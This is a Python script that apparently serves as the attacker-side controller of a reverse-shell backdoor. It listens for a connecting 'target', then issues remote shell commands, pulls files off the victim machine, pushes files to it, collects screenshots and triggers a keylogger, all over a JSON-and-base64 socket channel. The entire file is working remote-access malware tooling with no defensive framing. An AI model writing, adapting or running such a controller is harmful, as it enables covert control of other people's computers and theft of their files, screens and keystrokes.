#!/usr/bin/python  -  statement for linux
import base64
import socket
import json
count = 1


def reliable_send(data):
    # to send any amount of data we want

    json_data = json.dumps(data)
    target.send(json_data.encode())


def reliable_recieve():
    # to recieve as much data as we want

    json_data = ''
    while True:
        try:
            json_data = json_data + (target.recv(1024)).decode()
            return json.loads(json_data)
        except ValueError:
            continue


def shell():
    # sending commands
    global count
    while True:
        command = input("* Shell#~%s: " % str(ip))
        reliable_send(command)
        if command == 'q':
            break
        elif command[:2] == "cd" and len(command) > 1:
            continue

        # downloading files from target
        elif command[:8] == "download":
            with open(command[9:], "wb") as file:
                result = reliable_recieve()
                file.write(base64.b64decode(result))

        # uploading files to the target
        elif command[:6] == "upload":
            try:
                with open(command[7:], "rb") as file:
                    reliable_send(base64.b64encode(file.read()))
            except:
                failed = "File upload failed"
                reliable_send(base64.b64encode(failed))

        # recieving screenshot from target
        elif command[:10] == "screenshot":
            with open("screenshot %d" % count, "wb") as file:
                image = reliable_recieve()
                image_decoded = base64.b64decode(image)
                if image_decoded[:3] == "[-]":
                    print(image_decoded)
                else:
                    file.write(image_decoded)
                    count += 1

        elif command[:12] == "keylog_start":
            # starting keylogger
            continue

        else:
            result = reliable_recieve()
            print(result)


def server():
    # creating a simple connection

    global target
    global s
    global ip
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("127.0.0.1", 54321))
    s.listen(5)
    print("Listening")
    target, ip = s.accept()
    print("Target connected!")


server()
shell()
s.close()
